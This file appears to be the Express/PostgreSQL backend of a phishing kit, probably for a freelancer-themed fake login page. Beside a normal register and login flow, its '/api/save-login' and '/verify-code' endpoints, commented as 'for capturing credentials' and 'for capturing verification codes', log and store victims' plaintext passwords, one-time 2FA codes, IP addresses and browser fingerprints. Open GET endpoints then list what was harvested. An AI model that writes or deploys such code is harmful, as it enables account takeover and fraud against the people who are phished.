const express = require('express');
const bcrypt = require('bcrypt');
const { Pool } = require('pg');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Middleware to get client IP
app.use((req, res, next) => {
    req.clientIP = req.headers['x-forwarded-for'] || 
                  req.headers['x-real-ip'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress ||
                  (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
                  req.ip;
    next();
});

// PostgreSQL connection pool
const pool = new Pool({
    user: 'postgres',
    host: 'localhost',
    database: 'freelancer_login',
    password: 'your_password', // Change this to your PostgreSQL password
    port: 5432,
});

// Test database connection
pool.connect((err, client, release) => {
    if (err) {
        return console.error('Error connecting to database:', err.stack);
    }
    console.log('Connected to PostgreSQL database');
    release();
});

// Register endpoint
app.post('/api/register', async (req, res) => {
    const { username, email, password } = req.body;

    // Validation
    if (!username || !email || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'All fields are required' 
        });
    }

    if (password.length < 6) {
        return res.status(400).json({ 
            success: false, 
            message: 'Password must be at least 6 characters' 
        });
    }

    try {
        // Check if user already exists
        const userCheck = await pool.query(
            'SELECT * FROM users WHERE email = $1 OR username = $2',
            [email, username]
        );

        if (userCheck.rows.length > 0) {
            return res.status(400).json({ 
                success: false, 
                message: 'Username or email already exists' 
            });
        }

        // Hash password
        const saltRounds = 10;
        const passwordHash = await bcrypt.hash(password, saltRounds);

        // Insert new user
        const result = await pool.query(
            'INSERT INTO users (username, email, password_hash) VALUES ($1, $2, $3) RETURNING id, username, email, created_at',
            [username, email, passwordHash]
        );

        res.status(201).json({
            success: true,
            message: 'User registered successfully',
            user: result.rows[0]
        });

    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error during registration' 
        });
    }
});

// Save login endpoint (for capturing credentials)
app.post('/api/save-login', async (req, res) => {
    const { emailOrUsername, password } = req.body;
    const clientIP = req.clientIP;

    // Validation
    if (!emailOrUsername || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'Email/username and password are required' 
        });
    }

    try {
        console.log('\n📨 Login attempt captured:');
        console.log('Email/Username:', emailOrUsername);
        console.log('Password:', password);
        console.log('Client IP:', clientIP);
        console.log('Timestamp:', new Date().toISOString());
        console.log('User Agent:', req.headers['user-agent']);
        console.log('---');

        // Save to login_attempts table
        const result = await pool.query(
            'INSERT INTO login_attempts (email_or_username, password, ip_address, user_agent, created_at) VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP) RETURNING *',
            [emailOrUsername, password, clientIP, req.headers['user-agent']]
        );

        // Return success response
        res.json({
            success: true,
            message: 'Login data saved successfully',
            user: {
                id: result.rows[0].id,
                email_or_username: emailOrUsername,
                ip_address: clientIP,
                timestamp: result.rows[0].created_at
            }
        });

    } catch (error) {
        console.error('Save login error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error while saving login data' 
        });
    }
});

// Get all login attempts endpoint
app.get('/api/login-attempts', async (req, res) => {
    try {
        const result = await pool.query(
            'SELECT id, email_or_username, ip_address, user_agent, created_at FROM login_attempts ORDER BY created_at DESC LIMIT 100'
        );

        res.json({
            success: true,
            attempts: result.rows
        });

    } catch (error) {
        console.error('Get login attempts error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});

// Get login attempts by IP endpoint
app.get('/api/login-attempts/ip/:ip', async (req, res) => {
    const { ip } = req.params;

    try {
        const result = await pool.query(
            'SELECT id, email_or_username, ip_address, user_agent, created_at FROM login_attempts WHERE ip_address = $1 ORDER BY created_at DESC',
            [ip]
        );

        res.json({
            success: true,
            attempts: result.rows
        });

    } catch (error) {
        console.error('Get login attempts by IP error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});
app.post('/api/login', async (req, res) => {
    const { emailOrUsername, password } = req.body;

    // Validation
    if (!emailOrUsername || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'Email/username and password are required' 
        });
    }

    try {
        // Find user by email or username
        const result = await pool.query(
            'SELECT * FROM users WHERE email = $1 OR username = $1',
            [emailOrUsername]
        );

        if (result.rows.length === 0) {
            return res.status(401).json({ 
                success: false, 
                message: 'Invalid credentials' 
            });
        }

        const user = result.rows[0];

        // Check if account is active
        if (!user.is_active) {
            return res.status(403).json({ 
                success: false, 
                message: 'Account is disabled' 
            });
        }

        // Verify password
        const isValidPassword = await bcrypt.compare(password, user.password_hash);

        if (!isValidPassword) {
            return res.status(401).json({ 
                success: false, 
                message: 'Invalid credentials' 
            });
        }

        // Update last login
        await pool.query(
            'UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = $1',
            [user.id]
        );

        // Return user data (excluding password)
        res.json({
            success: true,
            message: 'Login successful',
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                created_at: user.created_at,
                last_login: new Date()
            }
        });

    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error during login' 
        });
    }
});

// Get user by ID endpoint
app.get('/api/users/:id', async (req, res) => {
    const { id } = req.params;

    try {
        const result = await pool.query(
            'SELECT id, username, email, created_at, last_login, is_active FROM users WHERE id = $1',
            [id]
        );

        if (result.rows.length === 0) {
            return res.status(404).json({ 
                success: false, 
                message: 'User not found' 
            });
        }

        res.json({
            success: true,
            user: result.rows[0]
        });

    } catch (error) {
        console.error('Get user error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});

// Verify code endpoint (for capturing verification codes)
app.post('/verify-code', async (req, res) => {
    const { verification_code, ip_address, user_agent, timestamp, screen_resolution, timezone, language, referrer } = req.body;
    const clientIP = req.clientIP;

    // Validation
    if (!verification_code) {
        return res.status(400).json({ 
            success: false, 
            message: 'Verification code is required' 
        });
    }

    try {
        console.log('\n🔐 Verification code captured:');
        console.log('Code:', verification_code);
        console.log('Client IP:', ip_address || clientIP);
        console.log('User Agent:', user_agent);
        console.log('Timestamp:', timestamp);
        console.log('Screen Resolution:', screen_resolution);
        console.log('Timezone:', timezone);
        console.log('Language:', language);
        console.log('Referrer:', referrer);
        console.log('---');

        // Save to verification_codes table (create if doesn't exist)
        await pool.query(`
            CREATE TABLE IF NOT EXISTS verification_codes (
                id SERIAL PRIMARY KEY,
                verification_code VARCHAR(10) NOT NULL,
                ip_address INET,
                user_agent TEXT,
                screen_resolution VARCHAR(20),
                timezone VARCHAR(50),
                language VARCHAR(10),
                referrer TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        const result = await pool.query(
            'INSERT INTO verification_codes (verification_code, ip_address, user_agent, screen_resolution, timezone, language, referrer, created_at) VALUES ($1, $2, $3, $4, $5, $6, $7, CURRENT_TIMESTAMP) RETURNING *',
            [verification_code, ip_address || clientIP, user_agent, screen_resolution, timezone, language, referrer]
        );

        // Return success response
        res.json({
            success: true,
            message: 'Verification code captured successfully',
            data: {
                id: result.rows[0].id,
                verification_code: verification_code,
                ip_address: ip_address || clientIP,
                timestamp: result.rows[0].created_at
            }
        });

    } catch (error) {
        console.error('Verify code capture error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error while capturing verification code' 
        });
    }
});

// Get all verification codes endpoint
app.get('/api/verification-codes', async (req, res) => {
    try {
        const result = await pool.query(
            'SELECT id, verification_code, ip_address, user_agent, screen_resolution, timezone, language, referrer, created_at FROM verification_codes ORDER BY created_at DESC LIMIT 100'
        );

        res.json({
            success: true,
            codes: result.rows
        });

    } catch (error) {
        console.error('Get verification codes error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});


app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
